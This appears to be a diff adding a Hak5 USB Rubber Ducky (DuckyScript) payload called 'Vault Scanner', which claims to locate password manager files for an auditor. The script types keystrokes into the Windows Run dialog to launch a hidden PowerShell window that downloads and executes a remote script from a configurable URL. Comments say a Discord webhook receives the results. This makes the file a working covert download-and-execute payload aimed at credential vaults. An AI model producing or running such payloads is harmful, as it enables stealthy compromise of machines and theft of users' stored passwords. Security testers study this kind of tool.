@@ -1,0 +1,20 @@
+REM Title: Vault Scanner - Password Manager File Scanner
+REM Author: Daniel Miranda Barcelona (Excal1bur)
+REM Description: Scans for password manager files, returning their full path so that the auditor can download them and check the password security level.
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: Recon
+REM Props: Hak5 Community
+
+REM ================= CONFIGURATION =================
+REM REQUIRED - Host your Vault_scanner.ps1 file and provide the URL here
+DEFINE #SCRIPT_URL Example.com
+
+REM REQUIRED - Your Discord webhook URL, which you must put in the ps1 vault_scanner script.
+
+DELAY 3000
+GUI r
+DELAY 500
+STRINGLN powershell -WindowStyle Hidden -Command "Invoke-Expression (Invoke-RestMethod '$#SCRIPT_URL$')"
+
+
